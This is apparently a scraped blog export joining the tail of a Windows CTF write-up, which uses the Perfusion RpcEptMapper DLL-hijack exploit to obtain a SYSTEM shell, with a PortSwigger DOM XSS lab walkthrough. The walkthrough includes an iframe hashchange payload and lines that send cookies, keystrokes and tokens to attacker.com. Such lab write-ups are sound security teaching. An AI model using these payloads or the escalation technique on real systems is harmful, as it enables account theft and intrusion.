HKCU. HKEY_USERS All actively loaded user profiles on the computer. HKCU is a subkey/view of one of these SIDs. Abbrev: HKU. HKEY_LOCAL_MACHINE Machine-wide configuration that applies to all users. Backed by machine hives like SYSTEM, SOFTWARE, SAM, SECURITY, DEFAULT. Abbrev: HKLM. HKEY_CLASSES_ROOT File-type/class registration view used for associations and COM. It is a merged view where HKCU\\Software\\Classes (per-user) overrides HKLM\\Software\\Classes (machine-wide). To change per-user defaults, write under HKCU\\Software\\Classes; to change machine defaults, write under HKLM\\Software\\Classes. Writing to HKCR is redirected to one of those locations depending on what exists. Abbrev: HKCR. HKEY_CURRENT_CONFIG View of the current hardware profile (primarily derived from SYSTEM hive data). Largely volatile and built at boot. Abbrev: HKCC. +In Plain English+: The Registry is a hierarchical key-value database used by Windows and apps for configuration. The data is stored in Hive files \u0026amp; Windows loads them at boot and writes any changes back to disk. There are Predefined keys (HKLM, HKCU, HKCR, HKU, HKCC) which are the root entry points that expose parts of the database \u0026amp; these Keys can contain subkeys and values. A value has a name, type (e.g., REG_SZ, REG_DWORD, REG_BINARY), and data.\nWindows subkeys Explained: So now that we understand what Hives \u0026amp; Keys are let\u0026rsquo;s look at subkeys, which is at the heart of this exploit.\nIf we take this path: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run here is the structure of the hive.\nHKEY_LOCAL_MACHINE root (top-level hive). SOFTWARE is a key under the hive. Microsoft is a subkey of SOFTWARE. Windows is a subkey of Microsoft. CurrentVersion is a subkey of Windows. Run is a subkey of CurrentVersion (this key contains values that tell Windows what programs to start) Visual representation of above:\nHKEY_LOCAL_MACHINE └─ SOFTWARE └─ Microsoft └─ Windows └─ CurrentVersion └─ Run ← key (contains values) ├─ (Default) ← value ├─ OneDrive ← value └─ SecurityTool ← value +In plain English+: A subkey is just a key that lives under another key. This is why a key can contain other keys (subkeys) and values. Values have a name, a type (REG_SZ, REG_DWORD, REG_BINARY) and data.\nIf we want to view the subkeys of a key we can use the below commands.\n# CMD: list immediate subkeys of CurrentVersion reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\u0026#34; # CMD: show a specific value (e.g., \u0026#39;ProgramFilesDir\u0026#39;) reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\u0026#34; /v ProgramFilesDir # CMD: show the (Default) value reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\u0026#34; /ve # CMD: recurse through all subkeys and values reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\u0026#34; /s # PowerShell: list subkeys (keys appear like folders) Get-ChildItem \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\u0026#34; # PowerShell: list values on a key Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\u0026#34; # PowerShell: show only value names on a key (Get-Item \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\u0026#34;).Property # PowerShell: read a specific value (Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\u0026#34;).ProgramFilesDir Back To The Exploit: Creating subkeys As Our User: So now that we know what subkeys are and how they relate to windows as a whole. We can continue examining this exploit.\nitm4n goes on to explain that a pre-defined performance subkey exists in Windows, this subkey is designed for performance monitoring of drivers within windows. As part of it\u0026rsquo;s functionality it enables a DLL to registered as a means to monitor driver performance.\nBelow is a section from the microsoft page :\nPerformance: A key that specifies information for optional performance monitoring. The values under this key specify the name of the driver’s performance DLL and the names of certain exported functions in that DLL. You can add value entries to this subkey using AddReg entries in the driver’s INF file.\nAs our user has the ability create subkeys they can create the performance subkey under the RpcEptMapper key entry.\nLooking at the linked microsoft page we can see the values that need to be added.\nHKEY_LOCAL_MACHINE \\SYSTEM \\CurrentControlSet \\Services \\application-name \\Performance Library = Name of your performance DLL Open = Name of your Open function in your DLL Collect = Name of your Collect function in your DLL Close = Name of your Close function in your DLL\nWhat Those Four Values Actually Do (Library/Open/Collect/Close): When Windows (or tools like WMI/PerfMon) wants counters for a service, it looks under that service\u0026rsquo;s …\\Services\\\u0026lt;ServiceName\u0026gt;\\Performance subkey. If it\u0026rsquo;s present it will.\nLoads the DLL from the Library value (absolute path). Calls three exported functions: Open… runs once to initialize. Collect… runs to fetch data. Close… runs when done. +In Plain English+: If we control the DLL path and those function exports, we control code that Windows will execute.\nWhy RpcEptMapper/DnsCache Are Special Here: On affected systems, regular domain users have Create Subkey on:\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\RpcEptMapper HKLM\\SYSTEM\\CurrentControlSet\\Services\\DnsCache With this privilege you can\u0026rsquo;t modify existing subkeys or their values; like Parameters/Security, but you can add a new Performance subkey and populate the four values Library, Open, Collect \u0026amp; Close. That’s enough to register a performance provider DLL for that service.\nThe Trigger (How The DLL Actually Gets Loaded) Once the subkey is created …\\Services\\RpcEptMapper\\Performance and the values for Library/Open/Collect/Close are set, we need Windows to query performance data so it will then load the malicious DLL.\nThe way that itm4n does this is to use WMI (Windows Management Instrumentation) .\nHe uses WMI to query the performance classes (simple \u0026amp; reliable):\nPowershell:\nGet-WmiObject Win32_Perf Get-WmiObject Win32_PerfRawData Get-WmiObject Win32_PerfFormattedData But why? Running any of the above queries causes the WMI service to enumerate performance providers and, in turn, load the DLL according to the Performance key. Which on vulnerable builds (such as this), the DLL is often loaded as NT AUTHORITY\\SYSTEM inside a WMI provider process.\n+Note+:\nOccasionally the DLL may be loaded under a less-privileged token due to impersonation, however itm4n states that trying again typically yields it being run as SYSTEM. Other perf queries (PerfMon UI, typeperf, Get-Counter) also enumerate providers and can trigger the load for services registered this way. The Exploit In Plain English: Our user can create the Performance subkey under RpcEptMapper …\\Services\\RpcEptMapper\\Performance \u0026amp; windows will trust what\u0026rsquo;s in the subkey for performance counters which means we can point the value of Library to a malicious DLL. We can then trigger a performance query to run e.g. WMI. Windows checks the service keys \u0026amp; in doing so loads the DLL, and *calls Open → Collect → Close. Our malicious code executes in the security context of the loading service via WMI service path, which is commonly ran as NT AUTHORITY\\SYSTEM. Exploiting The RpcEnpMapper Service: First we need to build the binary with Visual Studio.\nBuilding The Binary: To compile this you will need a windows host or windows vm. I prefer to use a Windows 10 VM customized with the Mandiant Commando script You will also require Visual Studio to compile this (+not Visual Studio Code+ ), so if you don\u0026rsquo;t have this you will need to install it .\nSetup the project:\nOpen visual studio Clone the repo Now we need to export it: Change the dropdown to \u0026ldquo;Release\u0026rdquo; Build the solution: Now we just need to build(compile) the binary. The files should be located in: C:\\Users\\[YourUserName]\\source\\repos\\Perfusion\\x64\\Release\\ We can use our existing shared folder to get the exploit onto the machine.\nGetting A System Shell Using Perfusion: Now all we have to do is run it:\n.\\Perfusion -c cmd -i And we have an NT AUTHORITY\\SYSTEM shell Get our root flag Lessons Learned: What did I learn? I learned so much on this box, itm4n\u0026rsquo;s writeup of the Perfusion exploit is incredible and I would highly recommend you read it. There are so many more things I have learned but they are too numerous to list. What silly mistakes did I make? Not cracking the staff.aacdb first time round, that would have been nice to spot. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

        "title": "DOM XSS Lab 5: jQuery :contains() selector sink with location.hash source",
        "tags": ["WebSecurity","XSS","DOM","JavaScript","jQuery","selector-injection","location.hash","hashchange","PortSwigger","web-exploitation","OWASP","security-research",],
        "content": "Lab 5: DOM XSS in jQuery selector sink using a hashchange event: This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery\u0026rsquo;s $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.\nTo solve the lab, deliver an exploit to the victim that calls the print() function in their browser.\nInitial Reconnaissance/Discovery: Navigating to the page we can see it\u0026rsquo;s a blog that has various posts. Clicking on a post we can see that there is a postId parameter. We also have the ability to leave comments on the page, however this is unrelated to what we are looking for. Analyzing the Source Code/Behavior: Navigating back to the home page if we view the source code we can see there is some JavaScript present. \u0026lt;script\u0026gt; $(window).on(\u0026#39;hashchange\u0026#39;, function(){ var post = $(\u0026#39;section.blog-list h2:contains(\u0026#39; + decodeURIComponent(window.location.hash.slice(1)) + \u0026#39;)\u0026#39;); if (post) post.get(0).scrollIntoView(); }); \u0026lt;/script\u0026gt; Let\u0026rsquo;s break down the code to see what it\u0026rsquo;s doing.\nDeclaring The Event Handler \u0026amp; Function: $(window).on(\u0026#39;hashchange\u0026#39;, function(){ We know this is jQuery as it is using the jQuery shorthand $() (plus there are jQuery files referenced in the source code).\nThis is an event handler that will trigger when the URL fragment (\u0026ldquo;hash\u0026rdquo;) changes after the page has loaded (for example, navigating from #A to #B on the same page).\nPost Navigation via Hash: var post = $(\u0026#39;section.blog-list h2:contains(\u0026#39; + decodeURIComponent(window.location.hash.slice(1)) + \u0026#39;)\u0026#39;); The code creates a variable called post. It uses jQuery’s selector engine via $() to look within the \u0026lt;section\u0026gt; named blog-list and then filter its \u0026lt;h2\u0026gt; elements using the :contains(...) selector.\ndecodeURIComponent(...) decodes any percent-encoded characters from the fragment so the text matches how it appears in the DOM.\nwindow.location.hash.slice(1) removes the leading #.\n+In Plain English+: If the URL is example.com/#My Blog Post, the handler (when the hash changes) takes My Blog Post, decodes it if needed, and uses it as text to match an \u0026lt;h2\u0026gt; inside \u0026lt;section class=\u0026quot;blog-list\u0026quot;\u0026gt; whose text contains that string.\n+Notes About+ :contains:\nThe jQuery :contains() selector matches by string \u0026amp; case, so Test is different from test but Test = \u0026quot;Test\u0026quot; as is test = \u0026quot;test\u0026quot; contains() is typically used with quotes around the text e.g. :contains('…'). The selector in this code is built without quotes, which changes how it gets parsed. https://api.jquery.com/contains-selector/ Scroll To The Post: if (post) post.get(0).scrollIntoView(); If a matching element is found, the page scrolls it into view with scrollIntoView().\nThis happens in the DOM as scrollIntoView() scrolls without reloading the page. Changing the hash updates the fragment and triggers the handler; the document itself isn\u0026rsquo;t reloaded because of this action.\nIf an element is not found no scroll will happen and an error should show in the console.\nIn this example I entered /#Non Existent which is not a valid \u0026lt;h2\u0026gt; header and we get the below error.\nUncaught TypeError: can\u0026#39;t access property \u0026#34;scrollIntoView\u0026#34;, post.get(...) is undefined \u0026lt;anonymous\u0026gt; https://0a8500bb0410a96580770394003a00a7.web-security-academy.net/#Non Existent:86 jQuery 2 Why This Errors With Invalid Hash Values: jQuery\u0026rsquo;s $() always returns a jQuery object, even when no elements match. This means the if(post) check is always truthy, it doesn\u0026rsquo;t actually verify that an element was found.\nWhen no match exists:\npost is an empty jQuery object [] (truthy) post.get(0) returns undefined calling undefined.scrollIntoView() throws TypeError Putting It All Together: After the document loads, changing the URL fragment (the part after #) fires the hashchange handler. The handler reads the fragment text (after removing # and decoding it) and uses it to select an \u0026lt;h2\u0026gt; inside the blog list that contains that text. If a real element is matched, it scrolls that element into view. To show it in action we can copy a post title. I will use I Wanted A Bike. +Note+: You may have different titles as these are randomized on load.\nType the title /#I Wanted A Bike in the address bar and commit the change. The browser updates the fragment (no full reload), the handler runs, and the page scrolls to the matching post.\n+Important+: Landing directly on a URL that already has a hash (e.g. opening /#My Post) typically does not fire hashchange on initial load. The event only fires on subsequent changes to the hash.\nVerifying decodeURIComponent Contents: We can confirm the value used by the selector by checking this in the console. Let\u0026rsquo;s step through this so it makes more sense.\nWe can find the location based on the hash:\nwindow.location.hash → e.g., \u0026quot;#I%20Wanted%20A%20Bike\u0026quot; We now slice off the hash showing everything after it.\nwindow.location.hash.slice(1) → \u0026quot;I%20Wanted%20A%20Bike\u0026quot; We now decode the sliced off value.\ndecodeURIComponent(window.location.hash.slice(1)) → \u0026quot;I Wanted A Bike\u0026quot; Confirming Source \u0026amp; Sink: Source (user-controlled): the URL hash text (everything after #) which is: decodeURIComponent(window.location.hash.slice(1)).\nSink (where that text is used): the jQuery selector string built inside $(), e.g. 'section.blog-list h2:contains(' + … + ')'.\nIf a heading matches, that element is then passed to scrollIntoView().\nWhy This Is Vulnerable - jQuery\u0026rsquo;s Selector Parsing: The vulnerability exists because the code concatenates user input directly into a jQuery selector WITHOUT quotes:\n$(\u0026#39;section.blog-list h2:contains(\u0026#39; + userInput + \u0026#39;)\u0026#39;) Expected safe usage:\n$(\u0026#39;section.blog-list h2:contains(\u0026#34;My Blog Post\u0026#34;)\u0026#39;) What actually happens if we inject a payload:\n$(\u0026#39;section.blog-list h2:contains(\u0026lt;img src=1 onerror=print()\u0026gt;)\u0026#39;) jQuery\u0026rsquo;s $() function attempts to determine if the string is:\nA CSS selector (like .class or #id) Or HTML to create (if it starts with \u0026lt;) When jQuery sees \u0026lt; at the start, it treats the entire string as HTML:\nParses \u0026lt;img src=1 onerror=print()\u0026gt; Creates the element in memory The onerror handler executes because src=1 is invalid This happens BEFORE the :contains() selector logic even runs +In Plain English+: The vulnerability exists because we can trick jQuery into thinking our malicious code is HTML that should be created, rather than text that should be searched for. Without quotes around the user input, jQuery can\u0026rsquo;t tell the difference between \u0026ldquo;search for this text\u0026rdquo; and \u0026ldquo;create this HTML element\u0026rdquo;. This lets us inject our own code that jQuery will happily parse and execute.\n+Takeaway+: (Caveat not a programmer) Don\u0026rsquo;t build jQuery selectors by gluing untrusted user input directly into the selector string. Instead properly escape/sanitize any user input before using it.\nExploitation POC: Triggering The Print Function: Now that we understand WHY this is vulnerable, let\u0026rsquo;s exploit it…\nSteps:\nWe will inject it directly in the URL so will enter the # symbol. We will use an element that can fire handlers when it fails, in this case we will use \u0026lt;img ... onerror=...\u0026gt;. Now we specify that the print() functionality should be triggered in the event of an error. Now we force an error by specifying a fake src image so that the error triggers: \u0026lt;img src=1 onerror= Final Payload: #\u0026lt;img src=1 onerror=print()\u0026gt; Result: Let\u0026rsquo;s put it directly in the URL and hit enter. As we can see it triggers the print function: However, this doesn\u0026rsquo;t solve the lab because it requires user interaction.\nThe vulnerability only triggers when the hash CHANGES (firing hashchange). If a victim opens a URL that already has our malicious hash, the event doesn\u0026rsquo;t fire on initial page load, it would only fire if they manually changed the hash afterward.\nHaving confirmed the direct URL approach works, we need to make it triggerable without user interaction…like an attacker would.\nFor the lab (simulating a real attack), we need a way to trigger the hashchange event without user interaction. That\u0026rsquo;s where the iframe technique comes in.\nExploitation: Crafting A Malicious iframe: If we actually look at the pre-amble to this lab here it says:\nTo actually exploit this classic vulnerability, you\u0026rsquo;ll need to find a way to trigger a hashchange event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an iframe: \u0026lt;iframe src=\u0026quot;https://vulnerable-website.com#\u0026quot; onload=\u0026quot;this.src+='\u0026lt;img src=1 onerror=alert(1)\u0026gt;'\u0026quot;\u0026gt;\nIn this example, the src attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire.\nTo do this we will need to use the built in exploit server provided by portswigger located at the top of the page Why are We Delivering The Exploit In An iframe? This technique simulates a real-world attack scenario. An attacker might set up a malicious website (maybe with a name similar to the legitimate site) and embed the vulnerable site inside an iframe with their malicious payload. They\u0026rsquo;d then trick users into visiting their page through phishing emails, fake ads, or other social engineering tactics.\nBut here\u0026rsquo;s the key problem we need to solve: the hashchange event only fires when the URL fragment changes, not when a page initially loads with a fragment already in the URL.\n+In Plain English+: If we simply send someone a link like https://victim.com/#\u0026lt;img src=1 onerror=print()\u0026gt;, nothing will happen. When they open that link, the page loads with the malicious hash already present. Since there\u0026rsquo;s no change to the hash, the hashchange event handler never fires, and our exploit code never runs.\nThe iframe technique solves this problem:\nThe iframe loads the victim page with just an empty hash: https://victim.com/# Once that page finishes loading (onload), JavaScript modifies the src to append our payload The hash changes from # to #\u0026lt;img src=1 onerror=print()\u0026gt; This change triggers the hashchange event inside the iframe The vulnerable code runs and our exploit executes The important thing to understand is that nothing reloads. We\u0026rsquo;re just manipulating the URL fragment, which JavaScript can do without making a new request. The hashchange event fires, the vulnerable code runs, and we get our XSS - all without any user interaction or page reload.\nPayload Breakdown: First we embed the target website in the body within an iframe:\n\u0026lt;iframe src=\u0026quot;https://[string].web-security-academy.net/\u0026quot;\u0026gt; +Note+: I have used [string] as a place holder for random instance portswigger generates.\nLet\u0026rsquo;s verify it\u0026rsquo;s loading as expected by clicking \u0026ldquo;View Exploit\u0026rdquo; As we can see the site is being rendered within the iframe. Adding a Trailing #: First we need to add a trailing /# to the URL.\n\u0026lt;iframe src=\u0026quot;https://[string].web-security-academy.net/#\u0026quot;\u0026gt; We do this so that anything we append after the hash stays within the fragment (not part of the path or query string)\nonload=: Now we need a way for our code run when the page loads, in order to do this we will use an onload event.\nThese events are used to trigger an action once the page loads so we can specify: \u0026ldquo;once the page loads, do X\u0026rdquo; this means we add onload=\u0026quot;\u0026quot; to our payload so it becomes.\n\u0026lt;iframe src=\u0026quot;https://[string].web-security-academy.net/#\u0026quot; onload=\u0026quot;\u0026quot;\u0026gt; this.src: We now need a way to have our payload concatenated after the iframe URL to do this we can use the snippet this.src +=, which is just short hand for:\nthis.src = this.src + [ConcatenatedValue]; This means if we have below code.\nthis.src+=\u0026#39;\u0026lt;img src=1 onerror=print()\u0026gt;\u0026#39; this → references the \u0026lt;iframe\u0026gt; element (because we\u0026rsquo;re inside its onload handler).\n.src (getter) → returns the iframe’s current URL as an absolute string e.g. https://[string].web-security-academy.net/#\n+= → this is the string concatenation as it takes current URL (we just grabbed) string appends what comes after (in this case our payload) \u0026amp; then reassigns it back which means a simple way to look at it is like this.\nthis.src = \u0026#39;https://[string].web-security-academy.net/#\u0026#39; + \u0026#39;\u0026lt;img src=1 onerror=print()\u0026gt;\u0026#39; and is then in turn returned as: 'https://[string].web-security-academy.net/#\u0026lt;img src=1 onerror=print()\u0026gt;'\n+In Plain English+: We load the target in an iframe, when it finishes loading, the onload handler appends our attacker controlled string to the URL fragment (#...). This doesn\u0026rsquo;t make a new request, it just updates location.hash inside the frame. The victim page\u0026rsquo;s vulnerable code then reacts to the hash change and splices that untrusted text into a jQuery selector (:contains(...)). Because the value isn\u0026rsquo;t safely quoted/escaped, we can influence what gets selected (and scrolled into view), demonstrating DOM control. Our payload never directly edits the victim DOM as it only changes the hash; the victim’s own JavaScript performs the unsafe selector interpolation.\nFinal Payload: Finally we need to close off our iframe with \u0026lt;/iframe\u0026gt; which will make the final payload:\n\u0026lt;iframe src=\u0026#34;https://[string].web-security-academy.net/#\u0026#34; onload=\u0026#34;this.src+=\u0026#39;\u0026lt;img src=1 onerror=print()\u0026gt;\u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; And if we place that in the box and click \u0026ldquo;Deliver exploit to victim\u0026rdquo; We should solve the lab Real-World Impact: While we used print() as a proof-of-concept, this vulnerability allows arbitrary JavaScript execution. Real attacks could:\nSession Hijacking: \u0026lt;img src=1 onerror=\u0026#34;fetch(\u0026#39;//attacker.com?c=\u0026#39;+document.cookie)\u0026#34;\u0026gt; Keylogging: \u0026lt;img src=1 onerror=\u0026#34;document.onkeypress=e=\u0026gt;fetch(\u0026#39;//attacker.com?k=\u0026#39;+e.key)\u0026#34;\u0026gt; Phishing: \u0026lt;img src=1 onerror=\u0026#34;document.body.innerHTML=\u0026#39;\u0026lt;fake-login-form\u0026gt;\u0026#39;\u0026#34;\u0026gt; Token Theft: \u0026lt;img src=1 onerror=\u0026#34;fetch(\u0026#39;//attacker.com?t=\u0026#39;+localStorage.getItem(\u0026#39;token\u0026#39;))\u0026#34;\u0026gt; The attacker just needs to trick a user into clicking a link or visiting a page with the malicious iframe - no other interaction required.\n",
